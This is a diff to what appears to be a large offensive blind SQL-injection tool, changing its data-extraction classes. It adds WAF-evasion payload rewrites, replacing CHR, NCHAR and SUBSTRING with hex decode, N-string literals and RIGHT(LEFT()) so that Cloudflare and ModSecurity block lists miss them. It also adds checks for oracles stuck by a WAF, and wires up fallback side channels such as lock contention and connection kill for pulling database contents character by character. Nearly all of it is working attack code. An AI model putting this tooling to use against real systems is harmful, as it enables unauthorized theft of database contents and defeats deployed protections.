@@ -131912,7 +131912,7 @@ class MultiStrategyExtractor:
         elif self.dbms in ("MySQL", "MariaDB"):
             _err_methods = [
                 ("div0",     "SELECT 1/0",              "SELECT 1"),
-                ("extract",  "SELECT EXTRACTVALUE(1,CONCAT(0x7e,1))", "SELECT 1"),
+                ("extractval","SELECT EXTRACTVALUE(1,CONCAT(0x7e,1))", "SELECT 1"),
                 ("updatexml","SELECT UPDATEXML(1,CONCAT(0x7e,1),1)",  "SELECT 1"),
                 ("exp",      "SELECT EXP(999999)",      "SELECT 1"),
                 ("gtid",     "SELECT GTID_SUBSET('x',1)","SELECT 1"),
@@ -133092,8 +133092,12 @@ class MultiStrategyExtractor:
                     _validated.append(name)
                     print(f"[MSE]  {name} FULLY validated (basic: 1=1T,1=2F | real: true{r3},false{r4})", flush=True)
                 elif r3 == r4:
-                    print(f"[MSE]   {name} basic OK but real condition gives same result (true{r3},false{r4})  WAF may block", flush=True)
-                    _validated.append(name)
+                    # BUG-MSE-NONFUNC-ORACLE FIX: when both the always-true and always-false
+                    # calibration probes return the same value the oracle cannot distinguish
+                    # True from False — it is non-functional. Do NOT add to _validated; adding
+                    # it causes every bit to come out the same, converging binary search to
+                    # all-high or all-low codepoints (garbage). Drop it instead.
+                    print(f"[MSE]   {name} basic OK but real condition gives same result (true{r3},false{r4})  oracle non-functional, dropping", flush=True)
                 else:
                     print(f"[MSE]  {name} real validation FAILED (true{r3},false{r4})", flush=True)
             except Exception as e:
@@ -134373,6 +134377,10 @@ class SideChannelExtractor:
         # _char_ord_cond switches to BYTEA comparison for PostgreSQL-family DBMSes, avoiding
         # all ordinal function names while preserving collation-neutral (byte-order) semantics.
         self._we_ordinal_blocked = False
+        # True once BYTEA/VARBINARY probes have been verified to work for this extractor
+        # instance. Caches the verification result across multiple extract_where_error calls
+        # so the overhead (2 extra round-trips) is paid only once per SideChannelExtractor.
+        self._we_bytea_ok = False
 
     def _quote_val(self, val: str) -> str:
         """
@@ -134990,17 +134998,33 @@ class SideChannelExtractor:
                 # codepoint ordering for all well-formed Unicode characters. NULL (beyond
                 # string end) propagates as NULL through BYTEA comparison, which maps to
                 # ok_len via the nearest-neighbor eval, correctly indicating EOS.
-                # CHR() is an output function rarely in WAF SQL-injection pattern lists.
+                # BUG-BYTEA-CHR-WAF FIX: CHR() is WAF-blocked as an extraction function name
+                # when _we_ordinal_blocked=True (WAF already blocks ASCII/ORD/UNICODE/CHR).
+                # Replace with decode('{hex}','hex') which encodes the threshold codepoint as
+                # a UTF-8 hex string — decode() is a generic data-conversion function not in
+                # WAF SQL-injection extraction block-lists.  Amazon Redshift uses TO_VARBYTE
+                # which is Redshift's equivalent hex-decode function.
                 # BUG-BYTEA-SUBSTRING-WAF FIX: SUBSTRING keyword is in Cloudflare and ModSec
                 # WAF block-lists as a direct SQL extraction fingerprint. Use RIGHT(LEFT(...))
                 # which is functionally identical but not in extraction-function block-lists.
-                return f"RIGHT(LEFT(({expr}),{pos}),1)::BYTEA>=CHR({threshold})::BYTEA"
+                _utf8_hex = chr(threshold).encode("utf-8").hex()
+                if self.dbms == "Amazon Redshift":
+                    return (f"RIGHT(LEFT(({expr}),{pos}),1)::BYTEA"
+                            f">=TO_VARBYTE('{_utf8_hex}','hex')")
+                return (f"RIGHT(LEFT(({expr}),{pos}),1)::BYTEA"
+                        f">=decode('{_utf8_hex}','hex')")
             elif self.dbms in ("MSSQL", "Sybase"):
                 # VARBINARY comparison avoids UNICODE()/COALESCE() patterns.
                 # CONVERT(BINARY(2),...) gives 2-byte big-endian UCS-2, preserving ordinal order.
                 # BUG-MSSQL-SUBSTRING-WAF FIX: SUBSTRING WAF-blocked; use RIGHT(LEFT(...)).
+                # BUG-MSSQL-NCHAR-WAF FIX: NCHAR() is WAF-blocked as an extraction function
+                # name (same block-list category as CHR/CHAR/ORD). Replace with N-string
+                # literal N'x' which requires no function call — the N prefix is BMP Unicode
+                # syntax accepted by all MSSQL/Sybase versions. Single quotes inside are
+                # doubled per SQL standard ('').
+                _char_literal = chr(threshold).replace("'", "''")
                 return (f"CONVERT(BINARY(2),RIGHT(LEFT(({expr}),{pos}),1))"
-                        f">=CONVERT(BINARY(2),NCHAR({threshold}))")
+                        f">=CONVERT(BINARY(2),N'{_char_literal}')")
             # Fall through to standard forms for other DBMSes
         if self.dbms in ("MySQL", "MariaDB", "TiDB"):
             return f"ORD(SUBSTRING(({expr}),{pos},1))>={threshold}"
@@ -135070,6 +135094,24 @@ class SideChannelExtractor:
             # WAF blocks all arithmetic conditions uniformly.  WAF-bypass ordinal mode is
             # already active so extraction can proceed directly without re-testing polarity.
             if self._we_ordinal_blocked:
+                # Ordinal WAF-blocking already confirmed on a prior call. Skip arithmetic
+                # sanity (1>0/1>2) — they are known to fail. If BYTEA mode has not yet
+                # been verified for this extractor instance, run 2 verification probes
+                # before trusting extraction results. threshold=33 ('!') should be True
+                # for any non-empty string; threshold=65534 should be False for all real
+                # SQL values. If BYTEA probes are also blocked, abort immediately rather
+                # than producing garbage codepoints.
+                if not self._we_bytea_ok:
+                    _bv_true = await self.eval_where_error(
+                        self._char_ord_cond(expr, 1, 33, True),
+                        random.randint(100000, 999999))
+                    _bv_false = await self.eval_where_error(
+                        self._char_ord_cond(expr, 1, 65534, True),
+                        random.randint(100000, 999999))
+                    if _bv_true is True and _bv_false is False:
+                        self._we_bytea_ok = True
+                    else:
+                        return ""
                 _san_true = None  # bypass: ordinal WAF-blocking already confirmed
                 _san_false = None
             else:
@@ -135119,7 +135161,29 @@ class SideChannelExtractor:
                         self._we_ordinal_blocked = True
                         print(f"[SideChannel] Ordinal WAF-blocking detected — switching to "
                               f"WAF-bypass ordinal comparison mode for {self.dbms}", flush=True)
-                        # sanity passes via real conditions; continue to extraction
+                        # BUG-BYTEA-VERIFY-AFTER-SWITCH FIX: after detecting ordinal-function
+                        # WAF-blocking and switching to BYTEA/VARBINARY mode, verify that BYTEA
+                        # comparison probes are themselves not also WAF-blocked before proceeding
+                        # to extraction. Without this check, a WAF that blocks both ordinal
+                        # functions AND BYTEA comparison syntax would cause all binary search
+                        # probes to return the same (blocked) result → all-True convergence to
+                        # garbage codepoints. Probe at threshold=33 (expected True: char >= '!'
+                        # for any non-empty real SQL value) and threshold=65534 (expected False:
+                        # no real SQL value contains a char at U+FFFE). Abort if BYTEA also fails.
+                        _bv_true = await self.eval_where_error(
+                            self._char_ord_cond(expr, 1, 33, True),
+                            random.randint(100000, 999999))
+                        _bv_false = await self.eval_where_error(
+                            self._char_ord_cond(expr, 1, 65534, True),
+                            random.randint(100000, 999999))
+                        if _bv_true is True and _bv_false is False:
+                            self._we_bytea_ok = True
+                        else:
+                            print(f"[SideChannel] BYTEA/VARBINARY probes also WAF-blocked "
+                                  f"({_bv_true}/{_bv_false}) — no viable extraction oracle",
+                                  flush=True)
+                            return ""
+                        # sanity passes via real conditions and BYTEA verified; continue to extraction
                     else:
                         print(f"[SideChannel] Oracle sanity FAILED "
                               f"(primary: 1>0→{_san_true}, 1>2→{_san_false}; "
@@ -135224,7 +135288,20 @@ class SideChannelExtractor:
                 elif not _above_z:
                     lo, hi = 97, 122              # confirmed: char ordinal in [97,122] (a-z)
                 else:
-                    lo, hi = 123, _sce_we_char_hi # above lowercase: {|}~, Latin-1 128+, Unicode
+                    # BUG-WE-STUCK-ORACLE-COARSE FIX: oracle claimed char >= ord('a') AND
+                    # >= ord('{'). Before accepting [123, ceiling] range, probe at ceiling-1
+                    # to detect a stuck-True oracle (WAF/CDN returning True for all conditions).
+                    # A genuine char in this range must return False at threshold=ceiling-1
+                    # (no real SQL value contains U+10FFFE or U+FFFE). If True, oracle is
+                    # uniformly returning True — abort this expression to prevent garbage output.
+                    _stuck_probe = await self.eval_where_error(
+                        self._char_ord_cond(expr, pos, _sce_we_char_hi - 1, _we_bypass),
+                        random.randint(100000, 999999))
+                    if _stuck_probe is True:
+                        _bsearch_converged = False
+                        lo = hi = _sce_we_char_hi  # force guard to break
+                    else:
+                        lo, hi = 123, _sce_we_char_hi  # above lowercase: {|}~, Latin-1 128+, Unicode
             else:
                 lo, hi = 32, 96                   # char < 'a': digits, uppercase, specials
 
@@ -135232,7 +135309,12 @@ class SideChannelExtractor:
             # (immune to ICU locale collation issues in PostgreSQL and other DBMSes).
             # BUG-SCE-WE-BSEARCH-UNCONVERGED FIX: track convergence flag to avoid
             # emitting chr(lo) when the search was interrupted before lo==hi.
+            # BUG-WE-STUCK-ORACLE-BSEARCH FIX: track whether any probe returned False.
+            # A WAF/CDN stuck-True oracle makes every probe return True → lo converges to
+            # ceiling (e.g. 1114111) which is garbage. If binary search completes with lo > 127
+            # and no False was ever seen, the oracle is stuck — abort via the guard below.
             _bsearch_converged = True
+            _had_false_result = False
             while lo < hi:
                 mid = _randomized_mid(lo, hi)
                 cond = self._char_ord_cond(expr, pos, mid + 1, _we_bypass)
@@ -135248,9 +135330,11 @@ class SideChannelExtractor:
                     lo = mid + 1
                 else:
                     hi = mid
+                    _had_false_result = True
                 await asyncio.sleep(0.3)
 
-            if lo < 32 or lo > _sce_we_char_hi or not _bsearch_converged:
+            if (lo < 32 or lo > _sce_we_char_hi or not _bsearch_converged
+                    or (not _had_false_result and lo > 127)):
                 break
 
             ch = chr(lo)
@@ -135324,7 +135408,17 @@ class SideChannelExtractor:
                 elif not _above_z:
                     lo, hi = 97, 122              # confirmed: char ordinal in [97,122] (a-z)
                 else:
-                    lo, hi = 123, _sce_tc_char_hi # above lowercase: {|}~, Latin-1 128+, Unicode
+                    # BUG-TC-STUCK-ORACLE-COARSE FIX: same stuck-oracle detection as
+                    # extract_where_error. Oracle claimed char >= ord('a') AND >= ord('{').
+                    # Probe at ceiling-1 to detect uniformly-True (WAF/CDN artifact) oracle.
+                    _tc_stuck_probe = await self.eval_where_error(
+                        self._char_ord_cond(column, pos, _sce_tc_char_hi - 1, _tc_bypass),
+                        random.randint(100000, 999999))
+                    if _tc_stuck_probe is True:
+                        _bsearch_converged = False
+                        lo = hi = _sce_tc_char_hi  # force guard to break
+                    else:
+                        lo, hi = 123, _sce_tc_char_hi  # above lowercase: {|}~, Latin-1 128+, Unicode
             elif _above_a is False:
                 _sce_tc_consecutive_fail = 0  # reset on non-None result
                 lo, hi = 32, 96
@@ -135346,7 +135440,10 @@ class SideChannelExtractor:
             # Binary search using ordinal comparison (locale-independent).
             # BUG-SCE-EXTTBLCOL-BSEARCH-UNCONVERGED FIX: add _bsearch_converged flag
             # to prevent emitting chr(lo) when the search was interrupted before lo==hi.
+            # BUG-TC-STUCK-ORACLE-BSEARCH FIX: track whether any probe returned False.
+            # Stuck-True oracle makes all probes True → lo converges to ceiling = garbage.
             _bsearch_converged = True
+            _had_false_result = False
             while lo < hi:
                 mid = _randomized_mid(lo, hi)
                 cond = self._char_ord_cond(column, pos, mid + 1, _tc_bypass)
@@ -135362,9 +135459,11 @@ class SideChannelExtractor:
                     lo = mid + 1
                 else:
                     hi = mid
+                    _had_false_result = True
                 await asyncio.sleep(0.3)
 
-            if lo < 32 or not _bsearch_converged:
+            if (lo < 32 or lo > _sce_tc_char_hi or not _bsearch_converged
+                    or (not _had_false_result and lo > 127)):
                 break
             ch = chr(lo)
             # BUG-SCE-EXTTBLCOL-LO-INIT FIX (v66): space-streak EOS detection.
@@ -135928,6 +136027,12 @@ class SideChannelExtractor:
 
         for pos in range(1, max_len + 1):
             lo, hi = 32, _sce_lc_char_hi  # BUG-V73 FIX: was hardcoded 255
+            # BUG-LC-STUCK-ORACLE FIX: binary search converges at lo == hi == _sce_lc_char_hi
+            # when the timing oracle is stuck-True (all probes exceed threshold due to network
+            # jitter or WAF interference). The guard `lo > _sce_lc_char_hi` uses strict >
+            # so it NEVER fires when lo == _sce_lc_char_hi — the garbage codepoint is appended.
+            # Fix: track _had_false_result and abort when lo > 127 with no False seen.
+            _had_false_result_lc = False
             while lo < hi:
                 # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
                 # Fixed pivot in advisory-lock prefix binary search.
@@ -135975,6 +136080,7 @@ class SideChannelExtractor:
                     lo = mid + 1
                 else:
                     hi = mid
+                    _had_false_result_lc = True
                 await asyncio.sleep(0.3)
 
             # BUG-LOCKCONTENTION-UPPER-GUARD FIX (v76): was `if lo < 32: break`.
@@ -135986,7 +136092,11 @@ class SideChannelExtractor:
             # is a structural asymmetry. Fix: mirror the exact pattern used in
             # _extract_with_eval (the direct sibling method) to ensure both bounds
             # are enforced uniformly across all SideChannelExtractor channels.
-            if lo < 32 or lo > _sce_lc_char_hi:  # BUG-LOCKCONTENTION-UPPER-GUARD FIX
+            # BUG-LC-STUCK-ORACLE FIX: also abort when stuck-True (no False ever seen
+            # and lo converged above 127). Binary search ends at lo==hi==_sce_lc_char_hi
+            # when stuck-True, so strict `lo > _sce_lc_char_hi` would never fire.
+            if (lo < 32 or lo > _sce_lc_char_hi
+                    or (not _had_false_result_lc and lo > 127)):
                 break
             ch = chr(lo)
             # BUG-SCE-LOCKCONTENTION-LO-INIT FIX: EOS via space streak.
@@ -136124,6 +136234,25 @@ class SideChannelExtractor:
         if _diffs:
             self._hdr_err_status = s1
             self._hdr_ok_status = s2
+            # BUG-SCE-HDR-PROBE-NO-LEN FIX: store body lengths so extract() can set up a
+            # length-based oracle when status codes are identical but body sizes differ.
+            self._hdr_err_len = l1
+            self._hdr_ok_len = l2
+            # BUG-SCE-HDR-PROBE-NO-HDR FIX: store first differing non-dynamic header so
+            # extract() can set up a header-based oracle when status and length are identical.
+            self._hdr_sig_hdr = None
+            self._hdr_sig_err_val = None
+            self._hdr_sig_ok_val = None
+            for _dh in set(list(h1.keys()) + list(h2.keys())):
+                if _dh.lower() in _DYNAMIC:
+                    continue
+                _dv1 = h1.get(_dh, "")
+                _dv2 = h2.get(_dh, "")
+                if _dv1 != _dv2:
+                    self._hdr_sig_hdr = _dh
+                    self._hdr_sig_err_val = _dv1
+                    self._hdr_sig_ok_val = _dv2
+                    break
             print(f"[SideChannel]  HEADER FINGERPRINT: {', '.join(_diffs[:3])}", flush=True)
             return True
 
@@ -136177,47 +136306,117 @@ class SideChannelExtractor:
                 return result
 
         # Channel 2: WHERE-ERROR (binary status code, zero noise)
+        # BUG-SCE-EXSWALLOW FIX: probe and extraction share one try/except, so any exception
+        # raised inside extract_where_error() (AttributeError, TypeError, network error) is
+        # caught here and treated as if the PROBE failed → silent fallthrough to Channel 3
+        # instead of surfacing the real bug. Fix: separate probe and extraction error handling.
+        _we_probe_ok = False
         try:
-            if await asyncio.wait_for(self.probe_where_error(), timeout=30):
-                return await self.extract_where_error(sql, max_len)
+            _we_probe_ok = await asyncio.wait_for(self.probe_where_error(), timeout=30)
         except Exception:
             pass
+        if _we_probe_ok:
+            return await self.extract_where_error(sql, max_len)
 
         # Channel 3: Header fingerprinting (error vs ok via headers)
+        # BUG-SCE-CH3-SIGNAL-LOST FIX: Previously the inner guard
+        # `if self._hdr_err_status != self._hdr_ok_status` silently discarded all
+        # header/body-length signals (non-status differences). Additionally, even in the
+        # status case, `_error_strategy` and `_signal_type` were never set, causing
+        # eval_where_error() to return None immediately on every probe → silent empty extraction.
+        # Fix: detect which signal type fired and set up _error_strategy + _signal_type + the
+        # appropriate calibration values before calling extract_where_error(). Also split the
+        # try/except so probe exceptions fall through but extraction exceptions propagate.
+        _hdr_probe_ok = False
         try:
-            if await asyncio.wait_for(self.probe_header_fingerprint(), timeout=20):
-                # Use WHERE-ERROR extraction with header-based detection
-                if self._hdr_err_status != self._hdr_ok_status:
-                    self._err_status = self._hdr_err_status
-                    self._ok_status = self._hdr_ok_status
-                    return await self.extract_where_error(sql, max_len)
+            _hdr_probe_ok = await asyncio.wait_for(self.probe_header_fingerprint(), timeout=20)
         except Exception:
             pass
+        if _hdr_probe_ok:
+            # Determine signal type from what probe_header_fingerprint() found
+            if self._hdr_err_status != self._hdr_ok_status:
+                self._err_status   = self._hdr_err_status
+                self._ok_status    = self._hdr_ok_status
+                self._signal_type  = "status"
+            elif (hasattr(self, "_hdr_err_len") and hasattr(self, "_hdr_ok_len")
+                  and self._hdr_err_len != self._hdr_ok_len):
+                self._err_len      = self._hdr_err_len
+                self._ok_len       = self._hdr_ok_len
+                self._signal_type  = "length"
+            elif hasattr(self, "_hdr_sig_hdr") and self._hdr_sig_hdr:
+                self._diff_hdr     = self._hdr_sig_hdr
+                self._err_hdr_val  = self._hdr_sig_err_val
+                self._ok_hdr_val   = self._hdr_sig_ok_val
+                self._signal_type  = "header"
+            else:
+                self._signal_type  = None
+            if self._signal_type:
+                # Pick the DBMS/context-appropriate error strategy. probe_where_error()
+                # already failed to validate one, so use the canonical per-DBMS default
+                # for the stacked vs. inline context. extract_where_error() will use
+                # this strategy to build extraction payloads — it does not re-validate.
+                if self._stacked:
+                    if self.dbms in ("MySQL", "MariaDB"):
+                        self._error_strategy = "mysql_if"
+                    elif self.dbms in ("MSSQL", "Sybase"):
+                        self._error_strategy = "mssql_if"
+                    elif self.dbms == "Oracle":
+                        self._error_strategy = "oracle_case"
+                    elif self.dbms == "SQLite":
+                        self._error_strategy = "sqlite_case"
+                    elif self.dbms == "DB2":
+                        self._error_strategy = "db2_case"
+                    elif self.dbms == "Firebird":
+                        self._error_strategy = "firebird_where"
+                    else:
+                        self._error_strategy = "where_div"
+                else:
+                    if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB",
+                                     "Amazon Redshift"):
+                        self._error_strategy = "arith_inline"
+                    elif self.dbms in ("MySQL", "MariaDB"):
+                        self._error_strategy = "mysql_if"
+                    elif self.dbms in ("MSSQL", "Sybase"):
+                        self._error_strategy = "mssql_if"
+                    else:
+                        self._error_strategy = "arith_inline"
+                return await self.extract_where_error(sql, max_len)
 
         # Channel 4: Connection kill (pg_cancel_backend produces different status)
+        _ck_probe_ok = False
         try:
-            if await asyncio.wait_for(self.probe_connection_kill(), timeout=20):
-                # Binary search using connection kill
-                return await self._extract_with_eval(sql, self.eval_connection_kill, max_len)
+            _ck_probe_ok = await asyncio.wait_for(self.probe_connection_kill(), timeout=20)
         except Exception:
             pass
+        if _ck_probe_ok:
+            return await self._extract_with_eval(sql, self.eval_connection_kill, max_len)
 
         # Channel 5: Lock contention (two-request side channel)
+        _lc_probe_ok = False
         try:
-            if await asyncio.wait_for(self.probe_lock_contention(), timeout=30):
-                return await self.extract_lock_contention(sql, max_len)
+            _lc_probe_ok = await asyncio.wait_for(self.probe_lock_contention(), timeout=30)
         except Exception:
             pass
+        if _lc_probe_ok:
+            return await self.extract_lock_contention(sql, max_len)
 
         # Channel 6: Large object creation
+        _lo_probe_ok = False
         try:
-            if await asyncio.wait_for(self.probe_large_object(), timeout=20):
-                if self._lo_create_status != self._lo_noop_status:
-                    self._err_status = self._lo_create_status
-                    self._ok_status = self._lo_noop_status
-                    return await self.extract_where_error(sql, max_len)
+            _lo_probe_ok = await asyncio.wait_for(self.probe_large_object(), timeout=20)
         except Exception:
             pass
+        if _lo_probe_ok:
+            self._err_status = self._lo_create_status
+            self._ok_status  = self._lo_noop_status
+            # BUG-SCE-CH6-NO-ORACLE-STATE FIX: extract_where_error() checks _signal_type
+            # and _error_strategy at entry; if unset it returns None immediately. Channel 6
+            # is PostgreSQL-stacked-only, so these are safe defaults.
+            if not getattr(self, "_signal_type", None):
+                self._signal_type = "status"
+            if not getattr(self, "_error_strategy", None):
+                self._error_strategy = "where_div"
+            return await self.extract_where_error(sql, max_len)
 
         print("[SideChannel] No viable side channel found", flush=True)
         return ""
@@ -136248,6 +136447,12 @@ class SideChannelExtractor:
                            else 255)
         for pos in range(1, max_len + 1):
             lo, hi = 32, _sce_ew_char_hi  # BUG-V73-SCE-EXTRACTWITHEVAL-DBMS-CEIL FIX: was hardcoded 255
+            # BUG-EW-STUCK-ORACLE FIX: Track whether any False result was ever seen during
+            # this character's binary search. If lo converges above 127 without a single
+            # False result, the eval_fn oracle is stuck-True (WAF blocks all conditions →
+            # all probes return True) and lo would converge to _sce_ew_char_hi producing
+            # a garbage codepoint. Abort the extraction if stuck-True is detected.
+            _had_false_result = False
             while lo < hi:
                 # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
                 # Fixed pivot in eval_fn prefix binary search.
@@ -136266,8 +136471,10 @@ class SideChannelExtractor:
                     lo = mid + 1
                 else:
                     hi = mid
+                    _had_false_result = True
                 await asyncio.sleep(0.3)
-            if lo < 32 or lo > _sce_ew_char_hi:  # BUG-V73 FIX: was hardcoded `lo > 255`
+            if (lo < 32 or lo > _sce_ew_char_hi
+                    or (not _had_false_result and lo > 127)):
                 break
             ch = chr(lo)
             # BUG-SCE-EXTRACTWITHEVAL-LO-INIT FIX: space-streak EOS detection.
